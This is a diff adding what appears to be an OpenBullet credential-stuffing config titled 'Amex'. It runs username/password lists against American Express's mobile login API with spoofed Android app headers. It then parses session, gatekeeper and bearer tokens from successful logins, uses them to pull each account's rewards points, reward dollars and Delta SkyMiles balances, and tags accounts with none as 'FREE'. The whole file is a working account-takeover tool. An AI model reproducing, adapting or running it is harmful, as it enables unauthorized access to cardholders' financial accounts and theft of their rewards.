@@ -1,0 +1,117 @@
+[SETTINGS]
+{
+  "Name": "Amex",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-07T16:19:14.3872862+07:00",
+  "AdditionalInfo": "",
+  "Author": "Meowtit",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "5",
+      "Id": 1128651924
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 1185832936
+    },
+    {
+      "SliceName": "USER",
+      "RuleType": 3,
+      "RuleString": "20",
+      "Id": 1805647968
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 3,
+      "RuleString": "20",
+      "Id": 1207088683
+    },
+    {
+      "SliceName": "USER",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 299562071
+    },
+    {
+      "SliceName": "USER",
+      "RuleType": 1,
+      "RuleString": " &>*$@",
+      "Id": 48315550
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://global.americanexpress.com/mobileone/msl/services/accountservicing/v1/loginsummary" AutoRedirect=TRUE 
+  CONTENT "{\"cardArtRequest\":[{\"minimumWidth\":1490,\"tag\":\"big-image\"}],\"checkSmsRedundancy\":false,\"loginCredentials\":{\"userIdLogin\":{\"password\":\"<PASS>\",\"rememberMeFlag\":true,\"userId\":\"<USER>\"}}}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: User-Agent: Amex/6.15.2 (Android; Android 5.1.1; Scale/1.3312501)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-AXP-AppVersion: 6.15.2" 
+  HEADER "X-AXP-AppInstallationId: cJNQb_HXicI" 
+  HEADER "X-AXP-DeviceModel: SM-N950FD" 
+  HEADER "X-AXP-TimeZoneOffset: 28800000" 
+  HEADER "X-AXP-AmexSession: " 
+  HEADER "X-AXP-Locale: en_US" 
+  HEADER "X-AXP-ClientType: Android" 
+  HEADER "X-AXP-AppId: com.americanexpress.android.acctsvcs.us" 
+  HEADER "X-AXP-OSVersion: 5.1.1" 
+  HEADER "X-AXP-DeviceOS: Android" 
+  HEADER "X-AXP-HardwareId: 0419021434120469" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+#PARSE_cupcake PARSE "<SOURCE>" LR "cupcake\":\"" "\"," Recursive=FALSE -> VAR "cupcake" "" "" 
+#PARSE_accountToken PARSE "<SOURCE>" LR "accountToken\":\"" "\"," Recursive=FALSE -> VAR "accountToken" "" "" 
+#PARSE_AmexSession PARSE "<SOURCE>" LR "AmexSession type=\\"AmexSession\\",value=\\"" "\\"" Recursive=FALSE -> VAR "AmexSession" "" "" 
+#PARSE_gateKeeperCookie PARSE "<SOURCE>" LR "gateKeeperCookie\":\"" "\"" Recursive=FALSE -> VAR "gateKeeperCookie" "" "" 
+#PARSE_rawToken PARSE "<SOURCE>" LR "rawToken\":\"" "\"}" Recursive=FALSE -> VAR "rawToken" "" "" 
+REQUEST GET "https://global.americanexpress.com/mobileone/msl/services/membership/v1/program/<accountToken>?origin=REWARDS" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-AXP-BlueBoxValues: <cupcake>" 
+  HEADER "X-AXP-AppVersion: 6.15.2" 
+  HEADER "X-AXP-AppInstallationId: cJNQb_HXicI" 
+  HEADER "X-AXP-DeviceModel: SM-N950FD" 
+  HEADER "X-AXP-TimeZoneOffset: 28800000" 
+  HEADER "X-AXP-AmexSession: AmexSession type=\"AmexSession\",value=\"<AmexSession>\"" 
+  HEADER "X-AXP-GateKeeper: <gateKeeperCookie>" 
+  HEADER "Authorization: Bearer <rawToken>" 
+  HEADER "X-AXP-Locale: en_US" 
+  HEADER "X-AXP-ClientType: Android" 
+  HEADER "X-AXP-AppId: com.americanexpress.android.acctsvcs.us" 
+  HEADER "X-AXP-OSVersion: 5.1.1" 
+  HEADER "X-AXP-DeviceOS: Android" 
+  HEADER "X-AXP-HardwareId: 0419021434120469" 
+#PARSE_Available_Points PARSE "<SOURCE>" LR "Available Points\",\"amount\":\"" "\"" Recursive=FALSE -> CAP "AvailablePoints" "" "" 
+#PARSE_Reward_Dollars PARSE "<SOURCE>" LR "Available Balance\",\"amount\":\"" "\"}" Recursive=FALSE -> CAP "Reward Dollars" "" "" 
+#PARSE_Delta_SkyMiles PARSE "<SOURCE>" LR "SkyMiles balance, which includes miles earned with your Card through your last statement balance.\",\"amount\":\"" "\"" Recursive=FALSE -> CAP "Delta SkyMiles" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" AND 
+    KEY "<SOURCE>" DoesNotContain "Available Points\",\"amount\":\"" 
+    KEY "<SOURCE>" DoesNotContain "Available Balance\",\"amount\":\"" 
+    KEY "<SOURCE>" DoesNotContain "SkyMiles balance, which includes miles earned with your Card through your last statement balance.\",\"amount\":\"" 
